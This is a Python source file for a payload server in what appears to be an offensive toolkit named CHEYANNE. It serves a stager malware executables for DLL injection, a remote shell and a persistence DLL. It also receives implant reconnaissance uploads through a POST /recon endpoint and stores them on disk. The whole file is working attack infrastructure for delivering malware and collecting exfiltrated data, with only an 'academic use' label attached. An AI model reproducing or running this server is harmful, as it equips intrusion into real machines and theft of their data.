"""
cheyanne_serve.py — CHEYANNE Payload Server
======================================
22DIV / george wu
Classification: UNCLASSIFIED // ACADEMIC USE ONLY

Simple HTTP file server that serves CHEYANNE payloads for the HTTP stager.
Maps clean URL paths to actual payload locations in the cheyanne tree.

Usage:
    python stagers\\cheyanne_serve.py          (default port 8080)
    python stagers\\cheyanne_serve.py 9090     (custom port)

Endpoints:
    GET /dark_room    -> dark_room/dark_room.exe
    GET /inject_dll   -> injection/cheyanne_inject.dll
    GET /inject_exe   -> injection/cheyanne_inject.exe
    GET /shell        -> shell/cheyanne_shell.exe

The server must be run from the cheyanne root directory,
or it won't find the payload files.
"""

import http.server
import os
import sys
import datetime

# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

DEFAULT_PORT = 8080

# URL path -> relative file path (from cheyanne root)
PAYLOAD_MAP = {
    "/dark_room":   "dark_room/dark_room.exe",
    "/inject_dll":  "injection/cheyanne_inject.dll",
    "/inject_exe":  "injection/cheyanne_inject.exe",
    "/shell":       "shell/cheyanne_shell.exe",
    "/persist":     "vectors/v7_phantom_dll/osppc.dll",
}

RECON_DIR = None  # Set in __main__

# ═══════════════════════════════════════════════════════════════════════
# REQUEST HANDLER
# ═══════════════════════════════════════════════════════════════════════

class VaderHandler(http.server.BaseHTTPRequestHandler):
    """Serves CHEYANNE payloads by mapped URL path."""

    # Suppress default stderr logging — we do our own
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        # Strip query string if any
        path = self.path.split("?")[0]

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client = f"{self.client_address[0]}:{self.client_address[1]}"

        # Check if the path maps to a known payload
        if path not in PAYLOAD_MAP:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"404 - unknown endpoint\n")
            print(f"  [{timestamp}] {client} -> GET {path} -> 404 NOT FOUND")
            return

        # Resolve the actual file path
        file_path = os.path.join(ROOT_DIR, PAYLOAD_MAP[path])

        if not os.path.isfile(file_path):
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(f"404 - payload not found: {PAYLOAD_MAP[path]}\n".encode())
            print(f"  [{timestamp}] {client} -> GET {path} -> 404 FILE MISSING ({PAYLOAD_MAP[path]})")
            return

        # Serve the file
        file_size = os.path.getsize(file_path)
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(file_size))
        self.send_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
        self.end_headers()

        with open(file_path, "rb") as f:
            # Stream in 8KB chunks — don't load entire payload into memory
            while True:
                chunk = f.read(8192)
                if not chunk:
                    break
                self.wfile.write(chunk)

        size_str = format_size(file_size)
        print(f"  [{timestamp}] {client} -> GET {path} -> 200 OK ({size_str})")

    def do_POST(self):
        path = self.path.split("?")[0]
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client = f"{self.client_address[0]}:{self.client_address[1]}"

        if path == "/recon":
            content_len = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_len) if content_len > 0 else b""

            recon_file = os.path.join(
                RECON_DIR,
                f"RECON_{client.replace(':', '_')}_{timestamp.replace(' ', '_').replace(':', '')}.txt"
            )
            os.makedirs(RECON_DIR, exist_ok=True)
            with open(recon_file, "wb") as f:
                f.write(body)

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK\n")

            print(f"  [{timestamp}] {client} -> POST /recon -> 200 OK "
                  f"({len(body)} bytes -> {os.path.basename(recon_file)})")
        else:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"404\n")
            print(f"  [{timestamp}] {client} -> POST {path} -> 404")

    def do_HEAD(self):
        """HEAD support — stager might check if payload exists before downloading."""
        path = self.path.split("?")[0]

        if path not in PAYLOAD_MAP:
            self.send_response(404)
            self.end_headers()
            return

        file_path = os.path.join(ROOT_DIR, PAYLOAD_MAP[path])
        if not os.path.isfile(file_path):
            self.send_response(404)
            self.end_headers()
            return

        file_size = os.path.getsize(file_path)
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(file_size))
        self.end_headers()


# ═══════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════

def format_size(size_bytes):
    """Human-readable file size."""
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f} KB"
    else:
        return f"{size_bytes / (1024 * 1024):.1f} MB"


def check_payloads():
    """Check which payloads are available and print status."""
    print("  Available payloads:")
    print()
    for url_path, file_path in PAYLOAD_MAP.items():
        full_path = os.path.join(ROOT_DIR, file_path)
        if os.path.isfile(full_path):
            size = format_size(os.path.getsize(full_path))
            status = f"READY ({size})"
        else:
            status = "NOT FOUND"
        # Pad for alignment
        print(f"    GET {url_path:<16} -> {file_path:<32} [{status}]")
    print()


# ═══════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Parse port from command line
    port = DEFAULT_PORT
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print(f"  [!] Invalid port: {sys.argv[1]}")
            sys.exit(1)

    # Resolve root directory — cheyanne root (parent of stagers/)
    # Works whether you run from cheyanne/ or stagers/
    script_dir = os.path.dirname(os.path.abspath(__file__))
    ROOT_DIR = os.path.dirname(script_dir)

    # If we're already in cheyanne root (no stagers/ parent), use cwd
    if not os.path.isdir(os.path.join(ROOT_DIR, "dark_room")):
        ROOT_DIR = os.getcwd()

    RECON_DIR = os.path.join(ROOT_DIR, "recon", "implant_uploads")

    # Verify we can see at least one payload directory
    if not os.path.isdir(os.path.join(ROOT_DIR, "dark_room")):
        print("  [!] Cannot find cheyanne directory tree.")
        print("  [!] Run from cheyanne root: python stagers\\cheyanne_serve.py")
        sys.exit(1)

    # Banner
    print()
    print("  +======================================================+")
    print("  |  CHEYANNE PAYLOAD SERVER — 22DIV / george wu          |")
    print("  |  Callsign: INDIA (serves HTTP stager)                 |")
    print("  +======================================================+")
    print(f"  |  Port:     {port:<43}|")
    print(f"  |  Root:     {ROOT_DIR[:43]:<43}|")
    print("  +======================================================+")
    print()

    check_payloads()

    print(f"  [*] Listening on 0.0.0.0:{port}")
    print(f"  [*] Stager command: cheyanne_stager.exe")
    print(f"  [*] Press Ctrl+C to stop")
    print()
    print("  --- REQUEST LOG ---")
    print()

    # Start server
    try:
        server = http.server.HTTPServer(("0.0.0.0", port), VaderHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n  [*] Server stopped.")
        server.server_close()
    except OSError as e:
        print(f"\n  [!] Cannot bind port {port}: {e}")
        print(f"  [!] Port in use? Try: python stagers\\cheyanne_serve.py {port + 1}")
        sys.exit(1)
